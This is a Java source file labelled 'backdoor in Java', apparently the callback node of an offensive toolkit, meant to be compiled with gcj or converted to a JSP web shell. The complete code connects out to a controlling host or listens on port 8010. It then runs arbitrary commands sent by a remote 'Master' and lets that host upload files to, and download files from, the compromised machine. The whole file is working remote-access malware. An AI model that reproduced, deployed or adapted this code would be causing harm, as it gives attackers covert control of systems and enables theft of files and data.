//javaNode.java - backdoor in Java
//do not use C style comments in this file , since it is parsed by java2jsp.py
  
 //This implements a callback javaNode
 
 //JSP comments look like this <%-- comment --%>
 //JSP imports look like this:
 //<% @page import="java.io.*" %> or <jsp:directive.page import="java.io.*"/>
 //Compile with (on SuSE Linux 10.0): gcj javaNode.java --main=javaNodeStarter -o javaNode
 //Usage: 
 //./javaNode <host> <port>
 //Simplicity and tinyness are key for this code. Even the source code needs
 //to be small. 
 
 //The basic features of a node are:
 // cd
 // cwd
 // runcommand
 // upload/download
 //
 // To build this as a jar (ie, to make ../Resources/javanode.jar, 
 // build it with gcj:
 // $ gcj javaNode.java javaNodeStarter.java
 // then jar it up
 // $ jar cvfm javanode.jar manifest javaNode.class javaNodeStarter.class
 // and copy into ../Resources
 
 
 import java.io.*;
 import java.net.*;
 
public class javaNode {
    public Socket mySocket=null;
    public DataInputStream input=null;
    public DataOutputStream output=null;
    public String host="127.0.0.1";
    public int port=5001;   
    public int listenport=8010;
        
    public void main() {
        String out="";
        boolean ret;
        String outstring=null; //for testing
        byte[] outdata=null;
        
        //out=runcommand("echo \"hi\""); //works on Linux
        //cd("/"); //works on Linux
        
        //System.out.println("PWD: " +outstring + " OUT=" + out);
        
        ret=connect(host,port);
        if (ret!=true) {
            ret=listen(listenport);
        }
        
        if (ret) {
            //we successfully connected
            mainloop();
        } 
        
    }
    
    public void sendresult(String stringdata) throws IOException {
        //now send data back out
        byte[] data;
        data=stringdata.getBytes();
        sendresult(data);
    }
    
    public void sendresult(byte[] data) throws IOException {
        this.output.writeInt(data.length);
        this.output.write(data,0,data.length);
    }
    
    public boolean listen(int port) {
        try {
            ServerSocket myServerSocket=new ServerSocket(port);
            this.mySocket=myServerSocket.accept();
            this.input = new DataInputStream(mySocket.getInputStream());
            this.output = new DataOutputStream(mySocket.getOutputStream());
            return true;
        } catch (IOException e) {
            //System.out.println("Failed to listen");
        }
        return false;
    }
    
    public void mainloop() {
        //Loops over each command from the Master - exits with no return value
        //when we are done or the connection fails
        byte[] data=null;
        byte[] outdata=null;
        int done=0;
        int length;
        int comtype;
        String outstring;
        
        try {
            while (done!=1) {
                length=this.input.readInt(); //read length                
                comtype=this.input.readInt(); //read command type
                data=new byte[length]; //allocate some space
                if (length>0x00100000) {
                    //check to see if our size is completely muddled
                    done=1;
                    continue;
                }
                this.input.readFully(data,0,length); //read data block
                if (comtype==1) {                    
                    //getcwd
                    //System.out.println("getcwd called");
                    outstring=getcwd();
                    sendresult(outstring);
                } else if (comtype==2) { 
                    //chdir
                    //System.out.println("cd to "+new String(data));
                    cd(new String(data));
                } else if (comtype==3) {
                    //runcommand 
                    //System.out.println("Runcommand "+new String(data));
                    outstring=runcommand(new String(data));
                    sendresult(outstring);
                } else if (comtype==4) {
                    //upload 
                    //System.out.println("Upload");
                    //upload block is:
                    //<size><0 0 0 4><length of name of file in big endian order><name of file><file data> 
                    DataInputStream body=new DataInputStream(new ByteArrayInputStream(data));
                    int filenameLength=body.readInt();
                    byte[] filenameBytes=new byte[filenameLength];
                    body.readFully(filenameBytes);
                    String filename=new String(filenameBytes);
                    byte[] filedata=new byte[length-4-filenameBytes.length];
                    body.readFully(filedata);
                    savefile(filename,filedata);
                    
                } else if (comtype==5) {
                    //download arguments are just a filename 
                    //System.out.println("Download "+data);
                    String filename=new String(data);
                    byte[] filedata=getfiledata(filename);
                    sendresult(filedata); //send it out
                }
                
            }
            
        }
        catch (IOException e) {
            done=1;
        }
        
    }
    
    public String getcwd() {
        //get's current working directory
        //getBytes might need to specify a char to bytes converter!
        return System.getProperty("user.dir");
    }
    
    public void cd(String newdir) {
        //this changes the current working directory of our process
        System.setProperty("user.dir", newdir);
    }
    
    public byte[] getfiledata(String filename) throws IOException {
        //read a file from the filesystem 
        FileInputStream input = new FileInputStream(filename);
        byte[] barray=new byte[input.available()]; //allocate the exact space we need
        input.read(barray); //read the data from the file into our array 
        return barray;
    }
    public void savefile(String filename, byte[] filedata)  throws IOException {
        //save a file to the file system
        //open the file
        FileOutputStream out = new FileOutputStream(filename);
        //write the data 
        out.write(filedata);
        out.close();
    }
    
    public boolean connect(String host, int port) {
        //System.out.println("Connecting to: "+host+":"+port);

        try {
            this.mySocket=new Socket(host,port); // create a TCP socket going outbound
            this.input = new DataInputStream(this.mySocket.getInputStream());
            this.output = new DataOutputStream(this.mySocket.getOutputStream());
            
            return true;
        }
        
        catch (IOException e) {
            //System.out.println("Failed to connect!");
            //do nothing, we failed
            
        } //end try catch
    return false;    
    } //end connect()
    
    public String runcommand(String command) {
        // Runs a single command and returns the output
        //    Returns an empty string if it failed
        
        String str=null,  out_str="";

        String prepend="";

        //we might not need this 
        String osname=new String(System.getProperty("os.name"));
        
        if (osname.indexOf("Windows")!=-1) {
            prepend="cmd.exe /c";
        }
       
    try 
    {
        Process p=Runtime.getRuntime().exec(prepend + command);
        BufferedReader buf = new BufferedReader(new InputStreamReader(p.getInputStream()));

        while((str = buf.readLine())!=null) {
            out_str= out_str + str + "\n";
        } //end while loop
    }//end try
    catch(IOException e) {
        //e.printStackTrace();
    } // End try/catch
    return out_str;
    }//end runcommand
}//end javaNode class


